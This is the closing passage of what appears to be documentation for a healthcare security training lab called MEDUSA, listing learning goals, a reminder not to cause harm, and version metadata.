- Develop security awareness
- Validate security controls
- Improve incident response

**Remember:** The goal is to learn and improve security, not to cause harm.

---

*Document Version: 1.0*  
*Last Updated: 2024-01-28*  
*Project: MEDUSA Healthcare Security Lab*

